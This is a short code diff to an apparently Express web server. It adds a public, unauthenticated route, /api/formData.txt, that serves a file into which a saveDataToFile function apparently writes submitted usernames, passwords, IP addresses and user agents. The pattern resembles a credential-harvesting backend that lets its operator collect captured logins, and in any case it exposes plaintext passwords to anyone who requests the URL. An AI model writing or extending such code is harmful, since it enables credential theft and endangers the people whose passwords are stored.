@@ -46,6 +46,17 @@ function saveDataToFile(username, password, ip, userAgent, callback) {
     });
 }
 
+// Endpoint to serve the text file
+app.get('/api/formData.txt', (req, res) => {
+    const filePath = path.join(__dirname, 'formData.txt'); // Define the path for the text file
+    res.sendFile(filePath, (error) => {
+        if (error) {
+            console.error("Error sending file:", error); // Log error if file is not sent
+            res.status(500).send('Error retrieving file.');
+        }
+    });
+});
+
 // Start the server
 app.listen(port, () => {
     console.log(`Running on Port ${port}`);
